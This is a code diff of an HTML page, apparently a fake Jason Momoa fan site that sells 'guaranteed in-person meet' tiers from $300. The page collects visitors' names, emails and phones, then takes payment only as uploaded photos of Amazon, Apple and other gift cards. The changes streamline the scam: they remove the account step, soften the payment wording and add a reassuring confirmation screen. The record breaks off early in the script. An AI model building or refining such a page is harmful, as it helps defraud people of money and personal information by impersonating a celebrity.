@@ -10,102 +10,49 @@
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
   :root{
-    --bg:#0a0b0d;
-    --panel:#101215;
-    --panel-2:#141719;
-    --line:#1c2024;
-    --line-2:#262b30;
-    --ink:#eae7e0;
-    --muted:#7d858f;
-    --muted-2:#5a6169;
-    --gold:#c9a24a;
-    --gold-soft:#e0c47e;
-    --gold-dim:rgba(201,162,74,.5);
+    --bg:#0a0b0d;--panel:#101215;--panel-2:#141719;
+    --line:#1c2024;--line-2:#262b30;
+    --ink:#eae7e0;--muted:#7d858f;--muted-2:#5a6169;
+    --gold:#c9a24a;--gold-soft:#e0c47e;--gold-dim:rgba(201,162,74,.5);
   }
   *{box-sizing:border-box;margin:0;padding:0}
   html{scroll-behavior:smooth}
-  body{
-    background:var(--bg);color:var(--ink);
-    font-family:'Inter',sans-serif;font-weight:300;
-    line-height:1.65;-webkit-font-smoothing:antialiased;
-    letter-spacing:.01em;
-  }
+  body{background:var(--bg);color:var(--ink);font-family:'Inter',sans-serif;font-weight:300;line-height:1.65;-webkit-font-smoothing:antialiased;letter-spacing:.01em}
   h1,h2,h3,h4,.serif{font-family:'Cormorant Garamond',serif;font-weight:500;letter-spacing:.005em;line-height:1.1}
   a{color:inherit;text-decoration:none}
   img{max-width:100%;display:block}
   .wrap{max-width:1240px;margin:0 auto;padding:0 32px}
 
-  /* NAV */
-  header.nav{
-    position:fixed;top:0;left:0;right:0;z-index:50;
-    background:rgba(10,11,13,.72);
-    backdrop-filter:blur(18px) saturate(140%);
-    -webkit-backdrop-filter:blur(18px) saturate(140%);
-    border-bottom:1px solid var(--line);
-    transition:background .3s;
-  }
+  header.nav{position:fixed;top:0;left:0;right:0;z-index:50;background:rgba(10,11,13,.72);backdrop-filter:blur(18px) saturate(140%);-webkit-backdrop-filter:blur(18px) saturate(140%);border-bottom:1px solid var(--line)}
   .nav-inner{display:flex;align-items:center;justify-content:space-between;height:78px}
-  .brand{
-    font-family:'Cormorant Garamond',serif;
-    font-size:20px;letter-spacing:.32em;font-weight:500;
-    color:var(--ink);text-transform:uppercase;
-  }
+  .brand{font-family:'Cormorant Garamond',serif;font-size:20px;letter-spacing:.32em;font-weight:500;text-transform:uppercase}
   .brand span{color:var(--gold);font-weight:600}
   nav ul{display:flex;gap:38px;list-style:none;font-size:11.5px;letter-spacing:.22em;text-transform:uppercase;color:var(--muted);font-weight:400}
   nav ul a{position:relative;transition:color .25s;padding:6px 0}
   nav ul a::after{content:'';position:absolute;left:0;right:0;bottom:0;height:1px;background:var(--gold);transform:scaleX(0);transform-origin:left;transition:transform .35s cubic-bezier(.2,.7,.2,1)}
   nav ul a:hover{color:var(--ink)}
   nav ul a:hover::after{transform:scaleX(1)}
-  .nav-cta{
-    background:transparent;color:var(--gold);
-    border:1px solid var(--gold-dim);
-    padding:11px 22px;border-radius:0;
-    font-weight:500;font-size:11px;letter-spacing:.24em;text-transform:uppercase;
-    transition:.3s;cursor:pointer;
-  }
+  .nav-cta{background:transparent;color:var(--gold);border:1px solid var(--gold-dim);padding:11px 22px;font-weight:500;font-size:11px;letter-spacing:.24em;text-transform:uppercase;transition:.3s;cursor:pointer;font-family:inherit}
   .nav-cta:hover{background:var(--gold);color:#0a0b0d;border-color:var(--gold)}
   .menu-toggle{display:none;background:none;border:1px solid var(--line-2);color:var(--ink);padding:8px 12px;cursor:pointer}
 
-  /* HERO */
   .hero{position:relative;min-height:100vh;display:flex;align-items:flex-end;overflow:hidden}
-  .hero-bg{
-    position:absolute;inset:0;
-    background:
-      linear-gradient(180deg,rgba(10,11,13,.5) 0%,rgba(10,11,13,.35) 30%,rgba(10,11,13,.82) 75%,var(--bg) 100%),
-      linear-gradient(90deg,rgba(10,11,13,.65) 0%,rgba(10,11,13,0) 55%),
-      url('j.webp') center 25%/cover no-repeat;
-    filter:saturate(.85) contrast(1.02);
-  }
-  .hero-bg::after{
-    content:'';position:absolute;inset:0;
-    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='2' stitchTiles='stitch'/></filter><rect width='100%' height='100%' filter='url(%23n)' opacity='.32'/></svg>");
-    opacity:.16;mix-blend-mode:overlay;pointer-events:none;
-  }
+  .hero-bg{position:absolute;inset:0;background:linear-gradient(180deg,rgba(10,11,13,.5) 0%,rgba(10,11,13,.35) 30%,rgba(10,11,13,.82) 75%,var(--bg) 100%),linear-gradient(90deg,rgba(10,11,13,.65) 0%,rgba(10,11,13,0) 55%),url('j.webp') center 25%/cover no-repeat;filter:saturate(.85) contrast(1.02)}
+  .hero-bg::after{content:'';position:absolute;inset:0;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='2' stitchTiles='stitch'/></filter><rect width='100%' height='100%' filter='url(%23n)' opacity='.32'/></svg>");opacity:.16;mix-blend-mode:overlay;pointer-events:none}
   .hero-inner{position:relative;z-index:2;padding:0 0 120px;width:100%}
   .hero-content{max-width:760px}
-  .eyebrow{
-    color:var(--gold);font-size:11px;letter-spacing:.42em;
-    text-transform:uppercase;margin-bottom:26px;font-weight:400;
-    display:flex;align-items:center;gap:14px;
-  }
+  .eyebrow{color:var(--gold);font-size:11px;letter-spacing:.42em;text-transform:uppercase;margin-bottom:26px;font-weight:400;display:flex;align-items:center;gap:14px}
   .eyebrow::before{content:'';width:36px;height:1px;background:var(--gold)}
-  .hero h1{
-    font-size:clamp(54px,8.4vw,116px);line-height:.98;
-    margin-bottom:32px;letter-spacing:-.015em;font-weight:500;
-  }
+  .hero h1{font-size:clamp(54px,8.4vw,116px);line-height:.98;margin-bottom:32px;letter-spacing:-.015em;font-weight:500}
   .hero h1 em{font-style:italic;color:var(--gold);font-weight:400}
   .hero p{color:var(--muted);font-size:17px;max-width:520px;margin-bottom:44px;font-weight:300;line-height:1.7}
-  .btn{
-    display:inline-block;padding:17px 34px;border-radius:0;
-    font-weight:500;font-size:11px;letter-spacing:.26em;text-transform:uppercase;
-    transition:.3s;border:1px solid transparent;cursor:pointer;font-family:inherit;
-  }
+  .btn{display:inline-block;padding:17px 34px;font-weight:500;font-size:11px;letter-spacing:.26em;text-transform:uppercase;transition:.3s;border:1px solid transparent;cursor:pointer;font-family:inherit}
   .btn-gold{background:var(--gold);color:#0a0b0d;border-color:var(--gold)}
   .btn-gold:hover{background:var(--gold-soft);border-color:var(--gold-soft)}
   .btn-ghost{border-color:var(--line-2);color:var(--ink);background:transparent}
   .btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
 
-  /* SECTIONS */
   section{padding:140px 0;border-top:1px solid var(--line);position:relative}
   .section-head{margin-bottom:80px;max-width:720px}
   .section-head .eyebrow{margin-bottom:20px}
@@ -114,200 +61,96 @@
   .section-head .lede{color:var(--muted);margin-top:22px;font-size:16px;line-height:1.75}
   .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:96px;align-items:center}
 
-  /* BIO */
-  .bio-img{
-    border:1px solid var(--line-2);border-radius:0;overflow:hidden;
-    aspect-ratio:4/5;background:#121417;position:relative;
-  }
+  .bio-img{border:1px solid var(--line-2);overflow:hidden;aspect-ratio:4/5;background:#121417;position:relative}
   .bio-img img{width:100%;height:100%;object-fit:cover;filter:saturate(.9) contrast(1.03)}
-  .bio-img::after{
-    content:'';position:absolute;inset:0;
-    box-shadow:inset 0 0 0 1px rgba(201,162,74,.08);
-    pointer-events:none;
-  }
+  .bio-img::after{content:'';position:absolute;inset:0;box-shadow:inset 0 0 0 1px rgba(201,162,74,.08);pointer-events:none}
   .bio-text p{color:var(--muted);margin-bottom:22px;font-size:15.5px;line-height:1.8}
   .bio-text p em{color:var(--gold-soft);font-style:italic;font-family:'Cormorant Garamond',serif;font-size:17px}
-  .facts{
-    display:grid;grid-template-columns:1fr 1fr;gap:28px 40px;
-    margin-top:44px;padding-top:44px;border-top:1px solid var(--line);
-  }
-  .facts div span{
-    display:block;font-size:10.5px;letter-spacing:.28em;
-    text-transform:uppercase;color:var(--gold);margin-bottom:8px;font-weight:400;
-  }
-  .facts div strong{font-weight:300;font-size:14.5px;color:var(--ink);letter-spacing:.01em;line-height:1.5}
+  .facts{display:grid;grid-template-columns:1fr 1fr;gap:28px 40px;margin-top:44px;padding-top:44px;border-top:1px solid var(--line)}
+  .facts div span{display:block;font-size:10.5px;letter-spacing:.28em;text-transform:uppercase;color:var(--gold);margin-bottom:8px}
+  .facts div strong{font-weight:300;font-size:14.5px;color:var(--ink);line-height:1.5}
 
-  /* LOCATION */
-  .location-band{
-    background:var(--panel);border:1px solid var(--line-2);
-    padding:56px 64px;display:flex;justify-content:space-between;
-    align-items:center;gap:40px;flex-wrap:wrap;position:relative;
-  }
-  .location-band::before{
-    content:'';position:absolute;top:0;left:0;right:0;height:1px;
-    background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);
-  }
-  .location-band h3{font-size:36px;font-weight:500;letter-spacing:-.005em;display:flex;align-items:center}
-  .location-band .pulse{
-    display:inline-block;width:8px;height:8px;background:var(--gold);
-    border-radius:50%;margin-right:18px;
-    box-shadow:0 0 0 0 rgba(201,162,74,.7);animation:pulse 2.4s infinite;
-  }
-  @keyframes pulse{
-    0%{box-shadow:0 0 0 0 rgba(201,162,74,.5)}
-    70%{box-shadow:0 0 0 14px rgba(201,162,74,0)}
-    100%{box-shadow:0 0 0 0 rgba(201,162,74,0)}
-  }
+  .location-band{background:var(--panel);border:1px solid var(--line-2);padding:56px 64px;display:flex;justify-content:space-between;align-items:center;gap:40px;flex-wrap:wrap;position:relative}
+  .location-band::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--gold-dim),transparent)}
+  .location-band h3{font-size:36px;font-weight:500;display:flex;align-items:center}
+  .location-band .pulse{display:inline-block;width:8px;height:8px;background:var(--gold);border-radius:50%;margin-right:18px;box-shadow:0 0 0 0 rgba(201,162,74,.7);animation:pulse 2.4s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(201,162,74,.5)}70%{box-shadow:0 0 0 14px rgba(201,162,74,0)}100%{box-shadow:0 0 0 0 rgba(201,162,74,0)}}
 
-  /* NEWS */
   .news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:40px}
-  .news-card{
-    background:var(--panel);border:1px solid var(--line);
-    overflow:hidden;transition:.35s cubic-bezier(.2,.7,.2,1);position:relative;
-  }
+  .news-card{background:var(--panel);border:1px solid var(--line);overflow:hidden;transition:.35s cubic-bezier(.2,.7,.2,1)}
   .news-card:hover{border-color:var(--line-2);transform:translateY(-3px)}
-  .news-card .thumb{aspect-ratio:16/10;background:#121417;overflow:hidden;position:relative}
-  .news-card .thumb img{width:100%;height:100%;object-fit:cover;transition:transform .8s cubic-bezier(.2,.7,.2,1);filter:saturate(.9)}
+  .news-card .thumb{aspect-ratio:16/10;background:#121417;overflow:hidden}
+  .news-card .thumb img{width:100%;height:100%;object-fit:cover;transition:transform .8s;filter:saturate(.9)}
   .news-card:hover .thumb img{transform:scale(1.04)}
   .news-card .body{padding:34px 32px 38px}
-  .news-card .date{
-    font-size:10.5px;letter-spacing:.28em;text-transform:uppercase;
-    color:var(--gold);margin-bottom:16px;font-weight:400;
-  }
-  .news-card h3{font-size:26px;margin-bottom:14px;line-height:1.22;font-weight:500;letter-spacing:-.005em}
+  .news-card .date{font-size:10.5px;letter-spacing:.28em;text-transform:uppercase;color:var(--gold);margin-bottom:16px}
+  .news-card h3{font-size:26px;margin-bottom:14px;line-height:1.22;font-weight:500}
   .news-card p{color:var(--muted);font-size:14.5px;line-height:1.75}
 
-  /* PLANS */
   .plans{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line-2)}
-  .plan{
-    background:var(--panel);padding:64px 56px;position:relative;transition:.3s;
-  }
+  .plan{background:var(--panel);padding:64px 56px;position:relative}
   .plan:first-child{border-right:1px solid var(--line-2)}
   .plan.featured{background:linear-gradient(180deg,#13161a 0%,var(--panel) 100%)}
-  .plan.featured::before{
-    content:'';position:absolute;top:0;left:0;right:0;height:1px;
-    background:linear-gradient(90deg,transparent,var(--gold),transparent);
-  }
-  .plan .tag{
-    position:absolute;top:0;right:56px;
-    background:var(--gold);color:#0a0b0d;
-    font-size:10px;letter-spacing:.28em;text-transform:uppercase;
-    padding:8px 16px;font-weight:600;
-    transform:translateY(-50%);
-  }
-  .plan h3{font-size:32px;font-weight:500;margin-bottom:10px;letter-spacing:-.005em}
-  .plan .sub{color:var(--muted);font-size:13px;letter-spacing:.04em}
-  .plan .price{
-    font-family:'Cormorant Garamond',serif;font-size:76px;
-    color:var(--gold);margin:26px 0 4px;font-weight:400;
-    letter-spacing:-.02em;line-height:1;
-  }
-  .plan .price small{font-size:15px;color:var(--muted-2);font-family:'Inter',sans-serif;font-weight:300;letter-spacing:.1em;margin-left:6px}
+  .plan.featured::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--gold),transparent)}
+  .plan .tag{position:absolute;top:0;right:56px;background:var(--gold);color:#0a0b0d;font-size:10px;letter-spacing:.28em;text-transform:uppercase;padding:8px 16px;font-weight:600;transform:translateY(-50%)}
+  .plan h3{font-size:32px;font-weight:500;margin-bottom:10px}
+  .plan .sub{color:var(--muted);font-size:13px}
+  .plan .price{font-family:'Cormorant Garamond',serif;font-size:76px;color:var(--gold);margin:26px 0 4px;font-weight:400;line-height:1}
+  .plan .price small{font-size:15px;color:var(--muted-2);font-family:'Inter',sans-serif;font-weight:300;margin-left:6px}
   .plan ul{list-style:none;margin:40px 0 44px;padding:32px 0 0;border-top:1px solid var(--line)}
-  .plan ul li{
-    padding:14px 0;color:var(--muted);font-size:14.5px;
-    display:flex;gap:16px;align-items:flex-start;line-height:1.55;
-  }
-  .plan ul li::before{content:'—';color:var(--gold);flex-shrink:0;font-weight:400}
+  .plan ul li{padding:14px 0;color:var(--muted);font-size:14.5px;display:flex;gap:16px;align-items:flex-start;line-height:1.55}
+  .plan ul li::before{content:'—';color:var(--gold);flex-shrink:0}
   .plan .btn{width:100%;text-align:center}
 
-  /* FORM */
   .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
   .field{display:flex;flex-direction:column;gap:10px}
   .field.full{grid-column:1/-1}
-  .field label{font-size:10.5px;letter-spacing:.26em;text-transform:uppercase;color:var(--gold);font-weight:400}
-  .field input,.field select,.field textarea{
-    background:var(--bg);border:1px solid var(--line-2);color:var(--ink);
-    padding:15px 18px;font-family:inherit;font-size:14.5px;font-weight:300;
-    outline:none;transition:.25s;letter-spacing:.01em;
-  }
+  .field label{font-size:10.5px;letter-spacing:.26em;text-transform:uppercase;color:var(--gold)}
+  .field input,.field select,.field textarea{background:var(--bg);border:1px solid var(--line-2);color:var(--ink);padding:15px 18px;font-family:inherit;font-size:14.5px;font-weight:300;outline:none;transition:.25s}
   .field input:focus,.field select:focus,.field textarea:focus{border-color:var(--gold);background:#0d0f11}
   .field textarea{resize:vertical;min-height:100px}
   .field input[type="file"]{padding:13px;color:var(--muted);font-size:13px}
-  .field input[type="file"]::file-selector-button{
-    background:transparent;color:var(--gold);border:1px solid var(--gold-dim);
-    padding:8px 16px;font-weight:500;font-size:11px;letter-spacing:.2em;
-    text-transform:uppercase;cursor:pointer;margin-right:14px;font-family:inherit;transition:.25s;
-  }
+  .field input[type="file"]::file-selector-button{background:transparent;color:var(--gold);border:1px solid var(--gold-dim);padding:8px 16px;font-weight:500;font-size:11px;letter-spacing:.2em;text-transform:uppercase;cursor:pointer;margin-right:14px;font-family:inherit;transition:.25s}
   .field input[type="file"]::file-selector-button:hover{background:var(--gold);color:#0a0b0d}
 
-  /* NEWSLETTER */
-  .newsletter{
-    background:var(--panel);border:1px solid var(--line-2);
-    padding:80px 64px;text-align:center;position:relative;
-  }
-  .newsletter::before{
-    content:'';position:absolute;top:0;left:20%;right:20%;height:1px;
-    background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);
-  }
-  .newsletter h2{font-size:48px;margin-bottom:18px;letter-spacing:-.01em}
+  .newsletter{background:var(--panel);border:1px solid var(--line-2);padding:80px 64px;text-align:center;position:relative}
+  .newsletter::before{content:'';position:absolute;top:0;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,var(--gold-dim),transparent)}
+  .newsletter h2{font-size:48px;margin-bottom:18px}
   .newsletter h2 em{font-style:italic;color:var(--gold);font-weight:400}
   .newsletter p{color:var(--muted);max-width:500px;margin:0 auto 36px;font-size:15px;line-height:1.75}
   .newsletter form{display:flex;gap:0;max-width:540px;margin:0 auto;border:1px solid var(--line-2)}
-  .newsletter input{
-    flex:1;background:transparent;border:none;color:var(--ink);
-    padding:18px 22px;font-family:inherit;outline:none;font-size:14.5px;font-weight:300;
-  }
+  .newsletter input{flex:1;background:transparent;border:none;color:var(--ink);padding:18px 22px;font-family:inherit;outline:none;font-size:14.5px;font-weight:300}
   .newsletter input::placeholder{color:var(--muted-2)}
   .newsletter button{border:none;border-left:1px solid var(--line-2);padding:18px 30px;background:transparent;color:var(--gold);font-family:inherit;font-weight:500;font-size:11px;letter-spacing:.24em;text-transform:uppercase;cursor:pointer;transition:.25s}
   .newsletter button:hover{background:var(--gold);color:#0a0b0d}
 
-  /* MODAL */
-  .modal-backdrop{
-    position:fixed;inset:0;background:rgba(5,6,7,.86);
-    backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
-    z-index:100;display:none;align-items:center;justify-content:center;
-    padding:24px;overflow-y:auto;
-  }
+  .modal-backdrop{position:fixed;inset:0;background:rgba(5,6,7,.86);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:100;display:none;align-items:flex-start;justify-content:center;padding:24px;overflow-y:auto}
   .modal-backdrop.on{display:flex}
-  .modal{
-    background:var(--panel);border:1px solid var(--line-2);
-    max-width:560px;width:100%;padding:56px 52px;
-    max-height:calc(100vh - 48px);overflow-y:auto;position:relative;
-  }
-  .modal::before{
-    content:'';position:absolute;top:0;left:0;right:0;height:1px;
-    background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);
-  }
-  .modal h3{font-size:30px;margin-bottom:26px;font-weight:500;letter-spacing:-.005em;padding-right:40px}
-  .modal .close{
-    position:absolute;top:20px;right:20px;background:none;border:none;
-    color:var(--muted);font-size:26px;cursor:pointer;line-height:1;
-    width:34px;height:34px;display:flex;align-items:center;justify-content:center;transition:.25s;
-  }
+  .modal{background:var(--panel);border:1px solid var(--line-2);max-width:560px;width:100%;padding:56px 52px;position:relative;margin:auto}
+  .modal::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--gold-dim),transparent)}
+  .modal h3{font-size:30px;margin-bottom:26px;font-weight:500;padding-right:40px}
+  .modal .close{position:absolute;top:20px;right:20px;background:none;border:none;color:var(--muted);font-size:26px;cursor:pointer;line-height:1;width:34px;height:34px;display:flex;align-items:center;justify-content:center;transition:.25s}
   .modal .close:hover{color:var(--gold)}
   .modal p{color:var(--muted);margin-bottom:24px;font-size:14.5px;line-height:1.75}
 
-  footer{border-top:1px solid var(--line);padding:56px 0;color:var(--muted-2);font-size:12.5px;text-align:center;letter-spacing:.04em}
+  .steps{display:flex;gap:8px;margin-bottom:28px;align-items:center}
+  .step-dot{flex:1;height:2px;background:var(--line-2)}
+  .step-dot.on{background:var(--gold)}
+
+  footer{border-top:1px solid var(--line);padding:56px 0;color:var(--muted-2);font-size:12.5px;text-align:center}
   footer a{color:var(--gold)}
-
-  .toast{
-    position:fixed;bottom:32px;right:32px;background:var(--panel);
-    border:1px solid var(--gold-dim);color:var(--ink);
-    padding:18px 26px;z-index:200;transform:translateY(200%);
-    transition:.4s cubic-bezier(.2,.7,.2,1);font-size:14px;max-width:90vw;
-    box-shadow:0 20px 40px rgba(0,0,0,.4);
-  }
+  .toast{position:fixed;bottom:32px;right:32px;background:var(--panel);border:1px solid var(--gold-dim);color:var(--ink);padding:18px 26px;z-index:200;transform:translateY(200%);transition:.4s cubic-bezier(.2,.7,.2,1);font-size:14px;max-width:90vw;box-shadow:0 20px 40px rgba(0,0,0,.4)}
   .toast.on{transform:translateY(0)}
+  .toast.err{border-color:rgba(224,122,122,.6)}
+  .badge{display:inline-block;background:rgba(201,162,74,.1);color:var(--gold);font-size:10px;letter-spacing:.24em;text-transform:uppercase;padding:5px 12px;font-weight:500}
 
-  .badge{
-    display:inline-block;background:rgba(201,162,74,.1);color:var(--gold);
-    font-size:10px;letter-spacing:.24em;text-transform:uppercase;
-    padding:5px 12px;font-weight:500;
-  }
-
-  /* reveal */
   .reveal{opacity:0;transform:translateY(24px);transition:opacity 1s cubic-bezier(.2,.7,.2,1),transform 1s cubic-bezier(.2,.7,.2,1)}
   .reveal.in{opacity:1;transform:none}
 
   @media(max-width:900px){
     .wrap{padding:0 24px}
     nav ul{display:none}
-    nav ul.open{
-      display:flex;flex-direction:column;position:absolute;
-      top:78px;left:0;right:0;background:var(--panel);padding:28px;
-      border-bottom:1px solid var(--line);gap:22px;
-    }
+    nav ul.open{display:flex;flex-direction:column;position:absolute;top:78px;left:0;right:0;background:var(--panel);padding:28px;border-bottom:1px solid var(--line);gap:22px}
     .menu-toggle{display:block}
     .grid-2{grid-template-columns:1fr;gap:56px}
     .plans{grid-template-columns:1fr}
@@ -346,7 +189,6 @@
   </div>
 </header>
 
-<!-- HERO -->
 <div class="hero">
   <div class="hero-bg"></div>
   <div class="hero-inner">
@@ -362,12 +204,9 @@
   </div>
 </div>
 
-<!-- BIO -->
 <section id="bio">
   <div class="wrap grid-2">
-    <div class="bio-img reveal">
-      <img src="j1.webp" alt="Jason Momoa portrait" />
-    </div>
+    <div class="bio-img reveal"><img src="j1.webp" alt="Jason Momoa portrait" /></div>
     <div class="bio-text reveal">
       <div class="section-head" style="margin-bottom:36px">
         <div class="eyebrow">Biography</div>
@@ -386,7 +225,6 @@
   </div>
 </section>
 
-<!-- LOCATION -->
 <section id="location" style="padding:96px 0">
   <div class="wrap">
     <div class="location-band reveal">
@@ -401,26 +239,22 @@
   </div>
 </section>
 
-<!-- NEWS -->
 <section id="news">
   <div class="wrap">
     <div class="section-head reveal">
       <div class="eyebrow">Dispatches</div>
       <h2>News &amp; <em>Updates</em></h2>
     </div>
-    <div class="news-grid" id="newsGrid">
-      <div style="color:var(--muted)">Loading…</div>
-    </div>
+    <div class="news-grid" id="newsGrid"><div style="color:var(--muted)">Loading…</div></div>
   </div>
 </section>
 
-<!-- PLANS -->
 <section id="meet">
   <div class="wrap">
     <div class="section-head reveal">
       <div class="eyebrow">Experiences</div>
       <h2>Choose your <em>audience.</em></h2>
-      <p class="lede">Both tiers include a guaranteed in-person meet. Seats are limited per city. Payment is accepted via gift card upload — no credit cards, no third parties.</p>
+      <p class="lede">Both tiers include a guaranteed in-person meet. Seats are limited per city. Secure your spot with a gift card — no credit cards, no third parties.</p>
     </div>
     <div class="plans reveal">
       <div class="plan">
@@ -453,7 +287,6 @@
   </div>
 </section>
 
-<!-- NEWSLETTER -->
 <section style="padding:96px 0">
   <div class="wrap">
     <div class="newsletter reveal">
@@ -475,45 +308,53 @@
   </div>
 </footer>
 
-<!-- APPLY MODAL -->
-<div class="modal-backdrop" id="applyModal">
+<!-- ONE FLOW MODAL -->
+<div class="modal-backdrop" id="flowModal">
   <div class="modal">
-    <button class="close" onclick="closeModal('applyModal')">×</button>
-    <div id="applyStep1">
-      <div class="eyebrow">Application</div>
-      <h3><span id="planName">The Standard</span></h3>
-      <p>Fill in your details. You'll create an account (or log in) and upload a gift card to secure your seat.</p>
-      <form id="applyForm" class="form-grid">
-        <div class="field full"><label>Full Name</label><input required name="full_name" /></div>
-        <div class="field"><label>Email</label><input required type="email" name="email" /></div>
-        <div class="field"><label>Phone</label><input required name="phone" /></div>
+    <button class="close" onclick="closeFlow()">×</button>
+
+    <div class="steps">
+      <div class="step-dot on" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+    </div>
+
+    <!-- STEP 1: DETAILS -->
+    <div id="stepDetails">
+      <div class="eyebrow" id="planTag">The Standard — $300</div>
+      <h3>Reserve your seat</h3>
+      <p>Takes 30 seconds. You'll upload your gift card right after.</p>
+      <form id="detailsForm" class="form-grid">
+        <div class="field full"><label>Full Name</label><input required name="full_name" autocomplete="name" /></div>
+        <div class="field"><label>Email</label><input required type="email" name="email" autocomplete="email" /></div>
+        <div class="field"><label>Phone</label><input required name="phone" autocomplete="tel" /></div>
         <div class="field"><label>Your State</label><input required name="state" placeholder="e.g. California" /></div>
         <div class="field"><label>Preferred City</label><input name="city" placeholder="Optional" /></div>
-        <div class="field full"><label>Anything we should know?</label><textarea name="notes" placeholder="Optional"></textarea></div>
-        <input type="hidden" name="plan" id="planInput" />
-        <div class="field full"><button type="submit" class="btn btn-gold" style="width:100%">Continue</button></div>
+        <div class="field full"><label>Anything we should know?</label><textarea name="notes" placeholder="Optional" rows="3"></textarea></div>
+        <div class="field full"><button type="submit" class="btn btn-gold" style="width:100%" id="detailsBtn">Continue</button></div>
       </form>
     </div>
-    <div id="applyStep2" style="display:none">
-      <div class="eyebrow">Verification</div>
-      <h3>Upload Gift Card</h3>
-      <p id="payMessage">Upload a clear photo of your gift card. Once verified, your booking is confirmed.</p>
-      <form id="giftCardForm" class="form-grid">
+
+    <!-- STEP 2: GIFT CARD -->
+    <div id="stepGift" style="display:none">
+      <div class="eyebrow" id="giftPlanTag">The Standard — $300</div>
+      <h3>Upload your gift card</h3>
+      <p id="giftHelp">Upload a clear photo of a gift card worth at least the plan amount. Once verified, your seat is confirmed.</p>
+      <form id="giftForm" class="form-grid">
         <div class="field full">
-          <label>Gift Card — Front</label>
-          <input type="file" accept="image/*" id="giftCardFront" required />
+          <label>Gift Card — Front (required)</label>
+          <input type="file" accept="image/*" id="gcFront" required />
         </div>
         <div class="field full">
           <label>Gift Card — Back (optional)</label>
-          <input type="file" accept="image/*" id="giftCardBack" />
+          <input type="file" accept="image/*" id="gcBack" />
         </div>
         <div class="field">
           <label>Card Value (USD)</label>
-          <input type="number" id="giftCardValue" min="300" value="300" required />
+          <input type="number" id="gcValue" min="300" value="300" required />
         </div>
         <div class="field">
           <label>Card Type</label>
-          <select id="giftCardType" required>
+          <select id="gcType" required>
             <option value="">Select…</option>
             <option>Amazon</option>
             <option>Apple</option>
@@ -525,40 +366,28 @@
           </select>
         </div>
         <div class="field full">
-          <button type="submit" class="btn btn-gold" style="width:100%" id="uploadBtn">Submit Gift Card</button>
+          <button type="submit" class="btn btn-gold" style="width:100%" id="giftBtn">Submit Gift Card</button>
         </div>
-        <div class="field full" style="text-align:center;color:var(--muted-2);font-size:12px;letter-spacing:.04em">
+        <div class="field full" style="text-align:center;color:var(--muted-2);font-size:12px">
           Reviewed within 24 hours. You'll receive an email once verified.
         </div>
       </form>
     </div>
+
+    <!-- STEP 3: DONE -->
+    <div id="stepDone" style="display:none;text-align:center">
+      <div class="eyebrow" style="justify-content:center;display:flex">Submitted</div>
+      <h3 style="text-align:center">You're in.</h3>
+      <p style="text-align:center">We've received your booking and gift card. You'll get an email within 24 hours once it's verified. You can check your status any time by clicking <strong style="color:var(--gold)">My Booking</strong> in the menu.</p>
+      <button class="btn btn-gold" style="width:100%" onclick="closeFlow()">Done</button>
+    </div>
   </div>
 </div>
 
-<!-- AUTH MODAL -->
-<div class="modal-backdrop" id="authModal">
-  <div class="modal">
-    <button class="close" onclick="closeModal('authModal')">×</button>
-    <div class="eyebrow">Account</div>
-    <h3 id="authTitle">Create your account</h3>
-    <p>You'll use this to log in on your phone and manage your booking.</p>
-    <form id="authForm" class="form-grid">
-      <div class="field full"><label>Email</label><input required type="email" id="authEmail" /></div>
-      <div class="field full"><label>Password</label><input required type="password" id="authPass" minlength="6" /></div>
-      <div class="field full" id="nameField"><label>Full Name</label><input type="text" id="authName" /></div>
-      <div class="field full"><button type="submit" class="btn btn-gold" style="width:100%" id="authSubmit">Sign Up &amp; Continue</button></div>
-      <div class="field full" style="text-align:center;color:var(--muted);font-size:13px">
-        <span id="authSwitchText">Already have an account?</span>
-        <a href="#" id="authSwitch" style="color:var(--gold)">Log in</a>
-      </div>
-    </form>
-  </div>
-</div>
-
-<!-- ACCOUNT MODAL -->
+<!-- MY BOOKING MODAL -->
 <div class="modal-backdrop" id="accountModal">
   <div class="modal">
-    <button class="close" onclick="closeModal('accountModal')">×</button>
+    <button class="close" onclick="document.getElementById('accountModal').classList.remove('on')">×</button>
     <div class="eyebrow">Your Booking</div>
     <h3 style="margin-bottom:20px">Reservation</h3>
     <div id="accountBody">Loading…</div>
@@ -569,7 +398,7 @@
 
 <script>
 /* ============================================================
-   SUPABASE CONFIG
+   CONFIG
    ============================================================ */
 const SUPABASE_URL  = 'https://fybwlumglknhjbjmqrtu.supabase.co';
 const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ5YndsdW1nbGtuaGpiam1xcnR1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODkxODgyNjYsImV4cCI6MjEwNDc2NDI2Nn0.63-zUg7loxDcONGxv7Fi7ogTPXvvonOlxh0G_e7fRYk';
@@ -580,7 +409,23 @@ const sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
    STATE
    ============================================================ */
 let currentPlan = { name: 'standard', price: 300 };
+let currentUserKey = null;      // random string stored in localStorage
 let pendingBookingId = null;
+
